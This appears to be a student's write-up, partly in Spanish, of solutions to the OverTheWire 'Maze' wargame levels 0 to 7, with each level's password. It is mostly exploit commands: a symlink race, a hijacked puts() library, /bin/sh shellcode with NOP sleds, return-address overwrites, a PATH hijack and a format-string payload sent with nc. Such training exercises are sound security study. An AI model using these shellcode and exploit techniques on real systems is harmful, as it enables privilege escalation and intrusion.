# Maze - LAB_5

## Maze Level 0
SSH : ssh maze0@maze.labs.overthewire.org -p 2225

~~~
cd /tmp
ltrace /maze/maze0
echo "AAAA" > "/tmp/128ecf542a35ac5270a87dc740918404"
ltrace /maze/maze0
ln -s /etc/maze_pass/maze0 /tmp/maze_link
./maze1

while [ 1 ]; 
  do  
 ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
 ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
done;

while [ 1 ]; 
  do  
 /maze/maze0
done;

hashaachon
~~~

## Maze Level 1
SSH : ssh maze1@maze.labs.overthewire.org -p 2225


~~~
/maze/maze1
utilizamos lo siguiente

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <dlfcn.h>

int puts(const char *s)
{
        char ch;
        FILE *fp;

        fp = fopen("/etc/maze_pass/maze2", "r"); // read mode

        printf("The %s pass file are:\n",s);

        while((ch = fgetc(fp)) != EOF)
                printf("%c", ch);

        fclose(fp);
        return 0;
}
~~~

~~~
gcc -m32 -fPIC -c puts.c -o libc.o
ld -shared -m elf_i386 -o libc.so.4 libc.o -ldl
/maze/maze1

beinguthok
~~~

## Maze Level 2
SSH : ssh maze2@maze.labs.overthewire.org -p 2225

~~~
gdb /maze/maze2
set args $(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90"')
break *0x0804844e
stepi
/wx 0xffffd6dc
stepi
set args $(python -c 'print "\xB8\xAA\xD8\xFF\xFF\xff\xe0"')
r
stepi

export EGG=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')
set args $(python -c 'print "\xb8\x60\xde\xff\xff\xff\xe0"')
r

/maze/maze2 $(python -c 'print "\xb8\x60\xde\xff\xff\xff\xe0"')
whoami
cat /etc/maze_pass/maze3

deekaihiek
~~~

## Maze Level 3
SSH : ssh maze3@maze.labs.overthewire.org -p 2225

~~~
/maze/maze3
/maze/maze3 A
strace /maze/maze3 A
objdump -d /maze/maze3
disas 0x080480cb

Dump of assembler code for function d1:
=> 0x080480cb <+0>:     pop    %eax
   0x080480cc <+1>:     cmpl   $0x1337c0de,(%eax)
   0x080480d2 <+7>:     jne    0x80480ed <d1+34>
   0x080480d4 <+9>:     xor    %eax,%eax
   0x080480d6 <+11>:    push   %eax
   0x080480d7 <+12>:    push   $0x68732f2f
   0x080480dc <+17>:    push   $0x6e69622f
   0x080480e1 <+22>:    mov    %esp,%ebx
   0x080480e3 <+24>:    push   %eax
   0x080480e4 <+25>:    push   %ebx
   0x080480e5 <+26>:    mov    %esp,%ecx
   0x080480e7 <+28>:    xor    %edx,%edx
   0x080480e9 <+30>:    mov    $0xb,%al
   0x080480eb <+32>:    int    $0x80
   0x080480ed <+34>:    mov    $0x1,%eax
   0x080480f2 <+39>:    xor    %ebx,%ebx
   0x080480f4 <+41>:    inc    %ebx
   0x080480f5 <+42>:    int    $0x80
End of assembler dump.

stepi
info reg
x/wx 0xffffd8c0
~~~
Intentamos nuevamente con AAAA
~~~
set args AAAA
r
stepi 177
stepi
info reg
x/wx 0xffffd8bd
~~~
~~~
/maze/maze3 $(python -c 'print "\xde\xc0\x37\x13"')
cat /etc/maze_pass/maze4
ishipaeroo
~~~

## Maze Level 4
SSH : ssh maze4@maze.labs.overthewire.org -p 2225

~~~
/maze/maze4
/maze/maze4 a
ltrace /maze/maze4 a
mkdir /tmp/maz4
cd /tmp/maz4
echo AAAA > a
ltrace /maze/maze4 a
~~~
Si los bytes 29-32 contienen 50, se posiciona en el byte 50 y se leen 32 bytes. 28 bytes de relleno (sin usar hasta ahora) "AAAABBBBCCCC..."
~~~
python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKLMNOPQRSTUVXYWZ"' > a
strace /maze/maze4 a
set args a
break *0x080486c8
r
info reg


python -c 'print "AAAABBB\xfe\xfeCCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKL\x04\xfc\x00\x00QRSTUVXYWZ"' > a
gdb /maze/maze4
set args a
break *(gdb) r
r
info reg ebp
x/wx 0xffffd654

ls -la a
python -c 'print "AAAABBB\xfe\xfeCCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKL\x04\xfc\x00\x00QRSTUVXYWZ" + "B"*60' > a
strace /maze/maze4 a
python -c 'print "#!/bin/sh" + "\x0a"+ "AAAAAAAAAAAAAAAAA" +"\x0a"+ "\x20\x00\x00\x00" + "B"*12 + "\xb8\x2e\x00\x00" +"B"*70' > a
strace /maze/maze4 a
PATH=.:$PATH
ln -s /bin/sh AAAAAAAAAAAAAAAAA
/maze/maze4 a
cat /etc/maze_pass/maze5

epheghuoli
~~~

## Maze Level 5
SSH : ssh maze5@maze.labs.overthewire.org -p 2225

~~~
/maze/maze5
ltrace /maze/maze5
gdb /maze/maze5
break *0x08048674
break *0x080485c8
r
jump *0x08048694
info reg eax edx
r
c

Continuing.

Breakpoint 2, 0x080485c8 in foo (s=0xffffd6ef "AAAAAA\\V", a=0xffffd6e6 "BCDEFGHI") at maze5.c:32
32      in maze5.c


/maze/maze5
 Username: onbdg\\V
      Key: BCDEFGHI

cat /etc/maze_pass/maze5
eTmuXji
~~~

## Maze Level 6
SSH : ssh maze6@maze.labs.overthewire.org -p 2225
~~~
/maze/maze6
ltrace /maze/maze6

~~~
utilizamos el siguiente codigo

~~~
void Print_Shdrs(int fd, int offset, int shstrndx, int num, int size) {
    int i;       // ebp - 8
    char *mem;   // ebp - 12
    char *mem2;  // ebp - 16
    char *mem3;  // ebp - 20
    char *dummy; // ebp - 60
    char *p = &dummy;
 
    lseek(fd, offset, SEEK_SET);
    mem = malloc(num * 40);
    read(fd, mem, num * 40);
 
    mem2 = mem + shstrndx * 40;
    lseek(fd, *(mem2 + 16), SEEK_SET);
    mem3 = malloc(*(mem2 + 20));
    read(fd, mem3, *(mem2 + 20));
 
    lseek(fd, offset, SEEK_SET);
    puts("\nNo  Name\t\tAddress\t\tSize");
 
    i = 0;
    while (num >= i) {
        read(fd, p, size);
        printf("%2d: %-16s\t0x%08x\t0x%04x\n", i,
               *(int *)mem3 + *(int *)p,
               *(int *)(p + 12),
               *(int *)(p + 20),
        );
        i++;
    }
    putchar('\n');
    free(mem3);
    free(mem);
}


read(fd, p, size)
export SC=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62 \x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd \x80")')
python -c 'print("\x00"*32+"\x00\x00\x00\x00"+"\x00"*10+"\x44\x00"+"\x00\x00" +"\x00\x00\x00\x00"+"\x00"*10+"\x0c\xdf\xff\xff")' > hello
/maze/maze7 hello

pohninieng
~~~

## Maze Level 7
SSH : ssh maze7@maze.labs.overthewire.org -p 2225

~~~
/maze/maze7
ltrace /maze/maze7
~~~
vemos el codigo descompilado
~~~
int main(int argc,char **argv)

{
  int __fd;
  int iVar1;
  __pid_t _Var2;
  size_t len;
  ssize_t sVar3;
  char replybuf [532];
  char buf [512];
  int sopt;
  sockaddr_in serv;
  int bytes;
  int client_sock;
  int serv_sock;
  char *answer;
  char *question;
  int port;
  
  answer = "god";
  port = 1337;
  if (argc == 2) {
    __fd = atoi(argv[1]);
    port = (uint16_t)__fd;
  }

  __fd = socket(2,1,6);
  if (__fd == -1) {
    perror("socket()");
    exit(1);
  }
  setsockopt(__fd,1,2,&sopt,4);
  serv.sin_family = 2;
  serv.sin_port = htons((uint16_t)port);
  serv.sin_addr = 0;
  memset(serv.sin_zero,0,8);
  iVar1 = bind(__fd,(sockaddr *)&serv,16);
  if (iVar1 == -1) {
    perror("bind()");
    exit(1);
  }
  iVar1 = listen(__fd,5);
  if (iVar1 == -1) {
    perror("listen()");
    exit(1);
  }
  alarm(1200);
  signal(14,alrm);
  signal(17,(__sighandler_t)1);
  while( true ) {
    client_sock = accept(__fd,(sockaddr *)0x0,(socklen_t *)0x0);
    _Var2 = fork();
    if (_Var2 == 0) break;
    close(client_sock);
  }
  len = strlen("Give the correct password to proceed: ");
  send(client_sock,"Give the correct password to proceed: ",len,0);
  sVar3 = recv(client_sock,buf,511,0);
  buf[sVar3] = '\0';
  if (strcmp(answer,buf) == 0) {
    strcpy(replybuf, "Err... I was just joking... yes, go away.\n");
  }
  else {
    snprintf(replybuf,512,buf);
    strcat(replybuf, " is wrong ^_^\n");
  }
  len = strlen(replybuf);
  send(client_sock,replybuf,len,0);
  _exit(0);
}
~~~
cambiamos a 0x8049d34
~~~
export SC=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62 \x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd \x80")')
python -c 'print("\x34\x9d\x04\x08\x36\x9d\x04\x08"+"%57092x%1$hn%8435x%2$hn")' | nc localhost 1337

shellcode_address=0xffffdf0c
LOB=$((shellcode_address - 8))  # LOB = 0xffffdf0c - 8 = 57092
HOB=$((0xffff - shellcode_address))

jopieyahng
~~~

